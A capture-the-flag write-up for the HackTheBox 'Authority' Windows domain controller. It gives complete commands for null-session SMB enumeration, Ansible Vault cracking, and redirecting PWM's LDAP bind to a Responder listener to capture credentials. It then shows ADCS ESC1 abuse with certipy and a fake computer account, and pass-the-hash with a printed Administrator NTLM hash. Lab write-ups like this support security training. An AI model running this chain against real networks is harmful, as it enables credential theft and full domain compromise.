
# HackTheBox — Authority

**Difficulty:** Medium | **OS:** Windows

---

## Overview

Authority is a medium-difficulty Active Directory machine centered around a misconfigured PKI infrastructure and exposed Ansible automation files. Starting from unauthenticated SMB null session access, the attack path chains cleartext credential exposure in Ansible Vault files, a PWM LDAP credential capture via Responder, and an ESC1 ADCS misconfiguration to forge a certificate as Administrator and obtain a full domain shell via Pass-the-Hash.

**Attack Path Summary:**

```
SMB Null Auth → Ansible Vault (ansible2john + crack)
→ PWM Config Editor → LDAP Credential Capture (Responder)
→ svc_ldap (WinRM) → certipy-ad ESC1 (CorpVPN template)
→ Fake Computer Account → Certificate as Administrator → PTH → SYSTEM
```

---

## Reconnaissance

### Port Scan

```bash
rustscan -a 10.129.229.56 -u 5000 -b 2000 -- -sCV
```

Full port sweep confirms a Windows Domain Controller with a broad attack surface — notably LDAP, Kerberos, WinRM, SMB, and an HTTPS service on port 8443.

### Clock Skew & Host Setup

Kerberos requires time synchronization. Fix before any further enumeration:

```bash
ntpdate -u 10.129.229.56
echo "10.129.229.56 authority.htb authority.authority.htb " | sudo tee -a /etc/hosts
```

### Web Enumeration — Port 8443

Port 8443 hosts a **PWM** (Password Management Web Application) login panel.

<img width="844" height="587" alt="Pasted image 20260524052605" src="https://github.com/user-attachments/assets/2811f9f5-21ad-4c01-8613-c46ddc243cc1" />


---

## Initial Foothold

### SMB Null Session

```bash
nxc smb 10.129.229.56 -u '' -p ''
```

<img width="1206" height="94" alt="Pasted image 20260524052616" src="https://github.com/user-attachments/assets/5ff05104-d20e-469e-84a3-bd9c33efcd79" />


Null authentication is enabled. Enumerating shares reveals an `ansible_inventory` file in one of the readable shares containing cleartext credentials:

```
ansible_user: administrator
ansible_password: Welcome1
ansible_port: 5985
```

<img width="419" height="143" alt="Pasted image 20260524052628" src="https://github.com/user-attachments/assets/b2bf613e-d7aa-4b1d-a791-4125f9f1a51d" />


These credentials did not authenticate against any service — likely stale or scoped to a different context. Continued enumeration of the share surfaces a `main.yml` file containing Ansible Vault encrypted blobs.

<img width="800" height="616" alt="Pasted image 20260524052712" src="https://github.com/user-attachments/assets/e467b8f4-05b1-4dc5-b7ce-3d768c2fac9a" />


### Ansible Vault — Hash Extraction & Cracking

The `admin_login` file serves as the vault password file (encrypted). Convert it to a crackable format:

```bash
ansible2john admin_login > admin_login.hash
john admin_login.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

<img width="722" height="188" alt="Pasted image 20260524052726" src="https://github.com/user-attachments/assets/9236ffb4-d29b-4584-a907-6139ac101b53" />


**Vault master password:** `!@#$%^&*`

With the vault password, decrypt all three encrypted credential files:

```bash
ansible-vault decrypt ldap_admin_password.hash --vault-password-file <(echo '!@#$%^&*')
# repeat for remaining vault files
```

**Credentials obtained:**

<img width="954" height="434" alt="Pasted image 20260524052740" src="https://github.com/user-attachments/assets/4b4709e3-ee4e-434d-bc09-ae77fbf73896" />


| Account    | Password       | Notes           |
| ---------- | -------------- | --------------- |
| `svc_pwm`  | `pWm@dm!N_!23` | PWM application |
| LDAP admin | `DevT3st@123`  | LDAP bind cred  |

---

## PWM Abuse — LDAP Credential Capture

### Authenticate to PWM

Using the `svc_pwm` credentials on the PWM web interface at `https://authority.htb:8443` — login successful.

### Config Editor → Responder Capture

PWM's **Configuration Editor** exposes the LDAP connection settings and allows modification without re-authentication. The attack:

1. Start Responder on `tun0`:

```bash
responder -I tun0 --lm
```

2. In PWM: navigate to **LDAP → LDAP Directories → default → Connection**
3. Add a custom LDAP URI pointing to your attack machine:

```
ldap://<your_tun0_ip>:389
```

4. Click **Test LDAP Profile** — PWM attempts to bind to the spoofed LDAP server and sends credentials in cleartext to Responder.

<img width="1054" height="646" alt="Pasted image 20260524052815" src="https://github.com/user-attachments/assets/7cd0798d-3dc1-43f8-b107-6e50feacccc0" />


**Credentials captured:**

```
svc_ldap : lDaP_1n_th3_cle4r!
```

<img width="982" height="278" alt="Pasted image 20260524052907" src="https://github.com/user-attachments/assets/89f919a6-d955-48d3-ab52-41f0b6bb1032" />


### WinRM Validation

```bash
nxc winrm 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
```

<img width="1156" height="137" alt="Pasted image 20260524052922" src="https://github.com/user-attachments/assets/a57bf081-ad24-47e7-902e-00d48d08b5fb" />


Access confirmed. Log in and grab the user flag:

```bash
evil-winrm -i 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
```

---

## Privilege Escalation — ADCS ESC1

### Certificate Enumeration

Navigating `C:\` reveals a `Certificates` share — consistent with the SMB enumeration at the start. Run a certipy scan:

```bash
certipy-ad find \
  -u svc_ldap@authority.htb \
  -p 'lDaP_1n_th3_cle4r!' \
  -ns 10.129.229.56 \
  -dc-host authority.htb.corp \
  -vulnerable
```

The `CorpVPN` template is vulnerable to **ESC1** (enrollee-supplied Subject Alternative Name with Client Authentication EKU). Enrollment rights are granted to **Domain Computers**.

<img width="212" height="39" alt="Pasted image 20260524052950" src="https://github.com/user-attachments/assets/178a154c-6c9f-42fe-9c5d-7aba266ed896" />

<img width="700" height="81" alt="Pasted image 20260524053002" src="https://github.com/user-attachments/assets/64a2497d-03fa-4cd1-8d67-80e5c49dfdcb" />

### Add a Fake Computer Account

`svc_ldap` is a service account, not a computer — enrollment requires a machine account. Add one via impacket:

```bash
impacket-addcomputer 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' \
  -dc-ip 10.129.229.56 \
  -computer-name 'FAKEBOX' \
  -computer-pass 'FakePass123!'
```

<img width="1150" height="123" alt="Pasted image 20260524053020" src="https://github.com/user-attachments/assets/2a866d08-a8c0-4401-b0c7-76a39e629f9b" />


### Obtain a TGT for the Fake Computer

```bash
impacket-getTGT 'authority.htb/FAKEBOX$:FakePass123!' -dc-ip 10.129.229.56
export KRB5CCNAME=FAKEBOX$.ccache
```

<img width="618" height="121" alt="Pasted image 20260524053033" src="https://github.com/user-attachments/assets/ae901cf4-172e-4b26-8178-dc23f6885bb9" />


### Request Certificate as Administrator (ESC1)

Abuse the `CorpVPN` template by specifying `administrator@authority.htb` as the UPN in the certificate request:

```bash
certipy-ad req \
  -u 'FAKEBOX$@authority.htb' \
  -p 'FakePass123!' \
  -dc-ip 10.129.229.56 \
  -target 'authority.authority.htb' \
  -ca 'AUTHORITY-CA' \
  -template 'CorpVPN' \
  -upn 'administrator@authority.htb'
```

<img width="992" height="182" alt="Pasted image 20260524053049" src="https://github.com/user-attachments/assets/b623bdf6-ac61-497b-b54b-0a234220d733" />


This issues `administrator.pfx`.

### Authenticate with the Certificate

```bash
certipy-ad auth -pfx 'administrator.pfx' -dc-ip 10.129.229.56
```

<img width="978" height="225" alt="Pasted image 20260524053105" src="https://github.com/user-attachments/assets/b5586397-95c9-4226-ab82-60eacc13807c" />



**Administrator NTLM hash extracted:**

```
6961f422924da90a6928197429eea4ed
```

---

## Domain Compromise

### Pass-the-Hash

```bash
evil-winrm -i 10.129.229.56 -u administrator -H 6961f422924da90a6928197429eea4ed
```

Shell obtained as `AUTHORITY\Administrator`.

<img width="538" height="45" alt="Pasted image 20260524053144" src="https://github.com/user-attachments/assets/a8d75db8-9ce8-41be-ab9d-2aae5e7c3325" />


---

_Writeup by ctxzero — HackTheBox: Authority_
